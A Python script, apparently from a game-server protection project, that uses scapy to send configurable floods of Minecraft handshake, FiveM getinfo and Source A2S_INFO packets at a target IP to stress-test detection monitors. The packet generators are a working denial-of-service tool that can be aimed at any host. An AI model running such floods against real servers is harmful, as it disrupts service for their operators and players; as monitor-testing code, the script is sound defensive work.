#!/usr/bin/env python3
"""
Game Attack Simulator
Part of Phase 10: Game Layer Stress Testing.

Responsibility: Generates protocol-specific traffic to test Layer G monitors.
"""

import sys
import argparse
import random
import time
import logging
from scapy.all import IP, TCP, UDP, Raw, send, conf
if sys.platform == "win32":
    try:
        from scapy.all import L3RawSocket
        conf.L3socket = L3RawSocket
    except ImportError:
        pass


# -----------------------------------------------------------------------------
# Attack Generators
# -----------------------------------------------------------------------------

def simulate_minecraft_handshake(target_ip, target_port, count, pps):
    logging.info(f"Simulating Minecraft Handshake flood to {target_ip}:{target_port} ({count} pkts @ {pps} pps)")
    
    # Minecraft Handshake Packet (Java Edition)
    # [VarInt ID 0x00] [VarInt Proto] [String Host] [Unsigned Short Port] [VarInt NextState]
    # Simplified payload: \x0f\x00 (length 15, ID 0) + fake data
    payload = b'\x0f\x00\x2f\x09localhost\x63\xdd\x01' 
    
    interval = 1.0 / pps if pps > 0 else 0
    for i in range(count):
        sport = random.randint(1024, 65535)
        pkt = IP(dst=target_ip)/TCP(sport=sport, dport=target_port, flags="PA")/Raw(load=payload)
        send(pkt, verbose=False)
        if interval > 0: time.sleep(interval)

def simulate_fivem_getinfo(target_ip, target_port, count, pps):
    logging.info(f"Simulating FiveM getinfo flood to {target_ip}:{target_port} ({count} pkts @ {pps} pps)")
    
    # FiveM / CitizenFX getinfo query
    payload = b'\xff\xff\xff\xffgetinfo xxx'
    
    interval = 1.0 / pps if pps > 0 else 0
    for i in range(count):
        sport = random.randint(1024, 65535)
        pkt = IP(dst=target_ip)/UDP(sport=sport, dport=target_port)/Raw(load=payload)
        send(pkt, verbose=False)
        if interval > 0: time.sleep(interval)

def simulate_source_a2s_info(target_ip, target_port, count, pps):
    logging.info(f"Simulating Source A2S_INFO flood to {target_ip}:{target_port} ({count} pkts @ {pps} pps)")
    
    # Source Engine A2S_INFO query
    payload = b'\xff\xff\xff\xff\x54Source Engine Query\x00'
    
    interval = 1.0 / pps if pps > 0 else 0
    for i in range(count):
        sport = random.randint(1024, 65535)
        pkt = IP(dst=target_ip)/UDP(sport=sport, dport=target_port)/Raw(load=payload)
        send(pkt, verbose=False)
        if interval > 0: time.sleep(interval)

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Game Protocol Attack Simulator")
    parser.add_argument("--type", required=True, choices=["minecraft", "fivem", "source"], help="Attack type")
    parser.add_argument("--target", required=True, help="Target IP")
    parser.add_argument("--port", type=int, help="Target Port (auto-picked if missing)")
    parser.add_argument("--count", type=int, default=100, help="Total packets to send")
    parser.add_argument("--pps", type=int, default=10, help="Packets per second")
    parser.add_argument("--log-level", default="INFO", help="Logging level")

    args = parser.parse_args()

    logging.basicConfig(level=args.log_level, format='%(asctime)s [%(levelname)s] %(message)s')

    # Default ports
    ports = {"minecraft": 25565, "fivem": 30120, "source": 27015}
    port = args.port if args.port else ports.get(args.type)

    try:
        if args.type == "minecraft":
            simulate_minecraft_handshake(args.target, port, args.count, args.pps)
        elif args.type == "fivem":
            simulate_fivem_getinfo(args.target, port, args.count, args.pps)
        elif args.type == "source":
            simulate_source_a2s_info(args.target, port, args.count, args.pps)
    except KeyboardInterrupt:
        logging.info("Simulation stopped by user.")
    except Exception as e:
        logging.error(f"Simulation error: {e}")

if __name__ == "__main__":
    main()
